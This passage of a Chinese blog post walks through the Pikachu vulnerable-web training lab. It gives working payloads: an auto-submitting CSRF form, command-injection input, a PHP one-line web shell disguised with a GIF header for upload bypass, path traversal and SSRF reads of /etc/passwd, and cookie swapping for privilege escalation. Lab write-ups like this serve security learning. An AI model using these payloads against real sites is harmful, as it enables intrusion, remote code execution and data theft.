+<h4 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h4><p>post请求相比之下就没有那么简单，需要继续诱骗用户进行点击按键才能实现，或许可以用重定向？</p>
+<img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933734.png" alt="image-20251009163502365" style="zoom:33%;" />
+
+<p>所以搭建一个网站可以重定向来提交表单，或者是用一个button来提交都可以</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF PoC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;f&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://node.hackhub.get-shell.com:45751/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">onload=<span class="function">()=&gt;</span><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;f&#x27;</span>).<span class="title function_">submit</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h4><p>造成CSRF漏洞的主要原因是请求敏感操作的数据包容易被伪造,只要在每次请求时都增加一个<code>Token</code>， 每次操作的时候进行验证，可以有效地防止csrf，因为csrf的时候都不能拿到token</p>
+<h2 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h2><p>后面会直接做sql-lab所以不在这里细写</p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>超级基础的rce</p>
+<h4 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h4><p>用<code>;</code>进行截断，或者用<code>&amp;</code>、<code>|</code>、<code>&amp;&amp;</code>和<code>||</code>都可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+
+<h4 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h4><p>eval属于危险函数，可以执行php命令，写马执行system都可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h4 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h4><p>控制filename可以实现任意文件读取，但是好像不能退出这个目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node.hackhub.get-shell.com:48833/vul/fileinclude/fi_local.php?filename=file6.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h4><p>在线靶场显示<code>warning:你的allow_url_include没有打开,请在php.ini中打开了再测试该漏洞,记得修改后,重启中间件服务!</code></p>
+<h2 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h2><h4 id="Unsafe-Filedownload-1"><a href="#Unsafe-Filedownload-1" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h4><p>可以直接实现文件下载，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node.hackhub.get-shell.com:48833/vul/unsafedownload/execdownload.php?filename=file6.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="Unsafe-Fileupload"><a href="#Unsafe-Fileupload" class="headerlink" title="Unsafe Fileupload"></a>Unsafe Fileupload</h2><h4 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h4><p>前端检测无意义，关掉js加载或者直接发包都可以</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span>  @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;huaji&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933735.png" alt="image-20251009184857544"></p>
+<h4 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h4><p>改Content-Type即可，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933736.png" alt="image-20251009185011611"></p>
+<h4 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h4><p><code>getimagesize()</code>函数会通过读取文件头部的几个字符串(即文件头), 来判断是否为正常图片的头部</p>
+<p>但是之前传的马已经考虑过了，所以内容不变</p>
+<h2 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h2><h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>登陆上kobe的账号，点击查看个人信息，发现用的是get请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node.hackhub.get-shell.com:55190/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=点击查看个人信息</span><br></pre></td></tr></table></figure>
+
+<p>这个时候只要把username改成其他用户即可水平越权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node.hackhub.get-shell.com:55190/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=点击查看个人信息</span><br></pre></td></tr></table></figure>
+
+<h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>提示中有：<code>这里有两个用户admin/123456,pikachu/000000,admin是超级boss</code></p>
+<p>所以我们登上admin，然后正常搞到一个请求，之后再拿到pikachu账号的cookie：<code>5ff8a110e136bfab243a2fadb1521b84</code>，把cookie改一下进行发包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933737.png" alt="image-20251009190422334"></p>
+<p>发现修改成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933738.png" alt="image-20251009190437404"></p>
+<h2 id=""><a href="#" class="headerlink" title="..&#x2F;..&#x2F;"></a>..&#x2F;..&#x2F;</h2><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>知周所众，<code>../</code>可以退出一层目录，所以退出多层就能访问到根目录，从而实现目录遍历</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://node.hackhub.get-shell.com:55190/vul/dir/dir_list.php?title=jarheads.php</span><br><span class="line">http://node.hackhub.get-shell.com:55190/vul/dir/dir_list.php?title=123</span><br><span class="line">http://node.hackhub.get-shell.com:55190/vul/dir/dir_list.php?title=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><h4 id="icanseeyourABC"><a href="#icanseeyourABC" class="headerlink" title="icanseeyourABC"></a>icanseeyourABC</h4><p>源代码里注释掉了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 测试账号:lili/123456--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p>参考自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/henry666/p/16947270.html">https://www.cnblogs.com/henry666/p/16947270.html</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacking&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$example</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="variable">$SerialString</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$example</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$SerialString</span>; <span class="comment">#输出: O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:33:&quot;&lt;script&gt;alert(&#x27;Hacking&#x27;)&lt;/script&gt;&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>基础</p>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h4 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9302528.html">https://www.cnblogs.com/backlion/p/9302528.html</a></p>
+<p>用的是在线靶场，所以没有自己写flag在根目录导致读不了文件</p>
+<h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><h4 id="不安全的URL跳转"><a href="#不安全的URL跳转" class="headerlink" title="不安全的URL跳转"></a>不安全的URL跳转</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3caf3f99-a318-4504-9a53-16a03b792b38.node5.buuoj.cn:81/vul/urlredirect/urlredirect.php?url=unsafere.php</span><br></pre></td></tr></table></figure>
+
+<p>修改url参数即可实现跳转位置改变</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h4 id="SSRF-curI"><a href="#SSRF-curI" class="headerlink" title="SSRF(curI)"></a>SSRF(curI)</h4><p>curl支持file协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3caf3f99-a318-4504-9a53-16a03b792b38.node5.buuoj.cn:81/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h4><p>同curl</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3caf3f99-a318-4504-9a53-16a03b792b38.node5.buuoj.cn:81/vul/ssrf/ssrf_fgc.php?file=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<p style="text-align: right;">
+by. Huaji
+</p>
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://huajihd.github.io">Huaji</a>
+            <p>原文链接：<a href="http://huajihd.github.io/2025/11/09/Pikachu/">http://huajihd.github.io/2025/11/09/Pikachu/</a>
+            <p>发表日期：<a href="http://huajihd.github.io/2025/11/09/Pikachu/">November 9th 2025, 10:28:16 pm</a>
+            <p>更新日期：<a href="http://huajihd.github.io/2025/11/09/Pikachu/">November 9th 2025, 10:28:34 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2025/11/09/hello-world/" title="Hello World">
+                    <div class="nextTitle">Hello World</div>
+                </a>
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2025/10/14/ycb2025-web/" title="羊城杯2025-web">
+                    <div class="prevTitle">羊城杯2025-web</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="mailto:2185374541@qq.com" class="iconfont-archer email" title="email" ></a>
+                <a href="//github.com/HuajiHD" class="iconfont-archer github" target="_blank" title="github"></a>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pikachu%E9%9D%B6%E5%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">Pikachu靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.1.1.</span> <span class="toc-text">基于表单的暴力破解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-onserver%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">验证码绕过(onserver）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-onclient"><span class="toc-number">1.1.3.</span> <span class="toc-text">验证码绕过(onclient)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#token%E9%98%B2%E7%88%86%E7%A0%B4"><span class="toc-number">1.1.4.</span> <span class="toc-text">token防爆破?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cross-Site-Scripting"><span class="toc-number">1.2.</span> <span class="toc-text">Cross-Site Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-get%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">反射型XSS(get）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-post"><span class="toc-number">1.2.2.</span> <span class="toc-text">反射型XSS(post)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">1.2.3.</span> <span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-number">1.2.4.</span> <span class="toc-text">DOM型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM%E5%9E%8BXSS-X"><span class="toc-number">1.2.5.</span> <span class="toc-text">DOM型XSS-X</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="toc-number">1.2.6.</span> <span class="toc-text">XSS之盲打</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="toc-number">1.2.7.</span> <span class="toc-text">XSS之过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E4%B9%8Bhtmlspecialchars"><span class="toc-number">1.2.8.</span> <span class="toc-text">XSS之htmlspecialchars</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="toc-number">1.2.9.</span> <span class="toc-text">XSS之href输出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="toc-number">1.2.10.</span> <span class="toc-text">XSS之js输出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">1.3.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF-get"><span class="toc-number">1.3.1.</span> <span class="toc-text">CSRF(get)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF-post"><span class="toc-number">1.3.2.</span> <span class="toc-text">CSRF(post)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF-Token"><span class="toc-number">1.3.3.</span> <span class="toc-text">CSRF Token</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Inject"><span class="toc-number">1.4.</span> <span class="toc-text">SQL-Inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.5.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exec-%E2%80%9Cping%E2%80%9D"><span class="toc-number">1.5.1.</span> <span class="toc-text">exec “ping”</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exec-%E2%80%9Ceval%E2%80%9D"><span class="toc-number">1.5.2.</span> <span class="toc-text">exec “eval”</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">1.6.</span> <span class="toc-text">File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Inclusion-local"><span class="toc-number">1.6.1.</span> <span class="toc-text">File Inclusion(local)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Inclusion-remote"><span class="toc-number">1.6.2.</span> <span class="toc-text">File Inclusion(remote)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unsafe-Filedownload"><span class="toc-number">1.7.</span> <span class="toc-text">Unsafe Filedownload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Filedownload-1"><span class="toc-number">1.7.1.</span> <span class="toc-text">Unsafe Filedownload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unsafe-Fileupload"><span class="toc-number">1.8.</span> <span class="toc-text">Unsafe Fileupload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#client-check"><span class="toc-number">1.8.1.</span> <span class="toc-text">client check</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MIME-type"><span class="toc-number">1.8.2.</span> <span class="toc-text">MIME type</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getimagesize"><span class="toc-number">1.8.3.</span> <span class="toc-text">getimagesize</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Over-Permission"><span class="toc-number">1.9.</span> <span class="toc-text">Over Permission</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="toc-number">1.9.1.</span> <span class="toc-text">水平越权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="toc-number">1.9.2.</span> <span class="toc-text">垂直越权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.10.</span> <span class="toc-text">..&#x2F;..&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">1.10.1.</span> <span class="toc-text">目录遍历</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.11.</span> <span class="toc-text">敏感信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#icanseeyourABC"><span class="toc-number">1.11.1.</span> <span class="toc-text">icanseeyourABC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.12.</span> <span class="toc-text">PHP反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-number">1.13.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.13.1.</span> <span class="toc-text">XXE漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.14.</span> <span class="toc-text">URL重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.14.1.</span> <span class="toc-text">不安全的URL跳转</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">1.15.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF-curI"><span class="toc-number">1.15.1.</span> <span class="toc-text">SSRF(curI)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF-file-get-content"><span class="toc-number">1.15.2.</span> <span class="toc-text">SSRF(file_get_content)</span></a></li></ol></li></ol></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 21
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2025/11/09/hello-world/">Hello World</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2025/11/09/Pikachu/">Pikachu</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/14</span>
+            <a class="archive-post-title" href="/2025/10/14/ycb2025-web/">羊城杯2025-web</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/07</span>
+            <a class="archive-post-title" href="/2025/10/07/bugkuawd-10-7/">bugku-awd小记10.7</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span>
+            <a class="archive-post-title" href="/2025/08/11/fengshentai/">封神台2025</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span>
+            <a class="archive-post-title" href="/2025/07/20/NewStar-CTF-2024-Web-Week2/">NewStar CTF 2024 Web Week2复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span>
+            <a class="archive-post-title" href="/2025/07/20/NewStar-CTF-2024-Web-Week3/">NewStar CTF 2024 Web Week3复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2025/07/18/NewStar-CTF-2024-Web-Week1/">NewStar CTF 2024 Web Week1复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/12</span>
+            <a class="archive-post-title" href="/2025/07/12/YWB2025-Final/">御网杯2025线下赛</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/06</span>
+            <a class="archive-post-title" href="/2025/07/06/BlitzCTF-WP/">BlitzCTF-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span>
+            <a class="archive-post-title" href="/2025/07/02/Junior-Crypt-2025/">Junior.Crypt.2025 CTF</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span>
+            <a class="archive-post-title" href="/2025/05/18/ISCC-WP/">ISCC2025-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span>
+            <a class="archive-post-title" href="/2025/04/20/UCSC-WP/">UCSC-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span>
+            <a class="archive-post-title" href="/2025/04/06/XYCTF-WP/">XYCTF-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/16</span>
+            <a class="archive-post-title" href="/2025/02/16/EHAX-WP/">EHAX_WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/27</span>
+            <a class="archive-post-title" href="/2025/01/27/TUCTF-WP/">TUCTF_WP</a>
+        </li>
+                </ul>
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/31</span>
+            <a class="archive-post-title" href="/2024/12/31/SQLByPass/">sql注入绕过技巧</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/25</span>
+            <a class="archive-post-title" href="/2024/12/25/vbsTestAutomation/">vbs自动化测试</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span>
+            <a class="archive-post-title" href="/2024/12/06/ouc-rob-blue/">重生之我在牢山抢小蓝</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/27</span>
